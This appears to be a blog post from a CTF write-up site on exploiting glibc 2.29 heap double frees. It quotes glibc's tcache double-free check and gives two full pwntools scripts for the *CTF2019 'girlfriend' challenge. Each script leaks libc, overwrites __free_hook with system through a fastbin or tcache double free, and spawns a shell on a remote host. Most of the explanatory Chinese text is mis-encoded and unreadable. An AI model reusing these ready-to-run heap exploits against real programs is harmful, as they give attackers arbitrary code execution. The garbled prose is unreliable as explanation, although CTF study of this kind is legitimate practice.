---
clayout: post
title:  "glibc2.29-double free"
date:   2020-2-18
desc: ""
keywords: ""
categories: [Binary]
tags: [pwn]
icon: icon-html
---

# glibc2.29-double free

> fastbin double freeï¼ŒğŸ‘´çš„é’æ˜¥å›æ¥ğŸŒ¶

## glibc2.29-tcache

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
#endif
```

glibc2.29åœ¨tcache_entryç»“æ„ä½“ä¸­åŠ ä¸Šä¸€ä¸ª8å­—èŠ‚æŒ‡é’ˆkeyï¼Œä½ç½®å°±æ˜¯bkçš„ä½ç½®ï¼Œchunkè¿›å…¥tcacheåï¼Œå°†chunk->keyè®¾ç½®ä¸ºtcachestruct(heapå¼€å¤´+0x10)

freeæ—¶ï¼Œè¿›tcacheå‰ä¼šæ£€æŸ¥chunk->keyæ˜¯å¦ä¸ºtcacheï¼Œå¦‚æœæ˜¯tcacheå°±ä¼šæ£€æŸ¥tcacheé“¾ä¸­æ˜¯å¦æœ‰ç›¸åŒçš„chunk

æŠŠchunk->keyæ”¹äº†å°±å¯ä»¥ç»•è¿‡æ£€æŸ¥ï¼Œä½†æ˜¯ğŸ‘´å¯»æ€ğŸ‘´éƒ½èƒ½æ‘¸åˆ°bkäº†åº”è¯¥ä¹Ÿèƒ½æ‘¸åˆ°fdï¼Œé‚£ğŸ‘´åº”è¯¥ä¹Ÿâ‘§éœ€è¦double freeäº†

ğŸ‘´æå‡ºæ¥fastbinï¼Œç„¶åfastbin double freeï¼Œæ¢¦å›2.23



## *CTF2019-girlfriend

double free

libcç™½ç»™ï¼Œfreeä¸€ä¸ªå¤§äºç­‰äº0x420ç„¶åshowå°±å®Œäº‹äº†

addä¸€å †ï¼Œå…ˆfree7ä¸ªï¼Œåé¢çš„å‡†å¤‡è¿›fastbinï¼Œç„¶åfastbin double freeåŸºæœ¬æ“ä½œ

```python
from pwn import *

#r = process(['./lib/ld-2.29.so','--library-path','./lib/','./babyheap'])
r = remote('node3.buuoj.cn',25085)
elf=ELF('./babyheap')
libc = ELF('./lib/libc.so.6')

def add(size,name):
    r.sendlineafter('choice:','1')
    r.sendlineafter('name',str(size))
    r.sendlineafter('name:',name)
    r.sendlineafter('call:','1')

def show(index):
    r.sendlineafter('choice:','2')
    r.sendlineafter('index:',str(index))
    r.recvuntil('name:')

def free(index):
    r.sendlineafter('choice:','4')
    r.sendlineafter('index:',str(index))

add(0x500,'fuck')
add(0x40,'/bin/sh\x00')
free(0)
show(0)
r.recvuntil('\n')
leak = u64(r.recvuntil('\x7f').ljust(8,'\x00'))
libc_base = leak-0x3b1ca0
log.success(hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
log.success(hex(free_hook))
add(0x500,'fuck')

for i in range(9):
	add(0x60,'fuck')
for i in range(8):
	free(i+2)
free(10)
free(11)
free(10)

for i in range(7):
	add(0x60,'fuck')

add(0x60,p64(free_hook-0x13))
add(0x60,'fuck')
add(0x60,'fuck')
add(0x60,'a'*0x13+p64(system))
free(1)
r.interactive()
```



glibc-2.27

```python
from pwn import *

r = remote('node3.buuoj.cn',29019)
elf=ELF('./babyheap')
libc = ELF('/libc-2.27.so')

def add(size,name):
    r.sendlineafter('choice:','1')
    r.sendlineafter('name',str(size))
    r.sendlineafter('name:',name)
    r.sendlineafter('call:','1')

def show(index):
    r.sendlineafter('choice:','2')
    r.sendlineafter('index:',str(index))
    r.recvuntil('name:')

def free(index):
    r.sendlineafter('choice:','4')
    r.sendlineafter('index:',str(index))

add(0x500,'fuck')
add(0x40,'/bin/sh\x00')
free(0)
show(0)
r.recvuntil('\n')
leak = u64(r.recvuntil('\x7f').ljust(8,'\x00'))
libc_base = leak-96-0x10-libc.sym['__malloc_hook']
log.success(hex(libc_base))

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
log.success(hex(free_hook))

add(0x60,'fuck')
add(0x60,'fuck')
free(2)
free(2)
add(0x60,p64(free_hook-0x13))
add(0x60,'fuck')
add(0x60,'a'*0x13+p64(system))
free(1)
r.interactive()

```

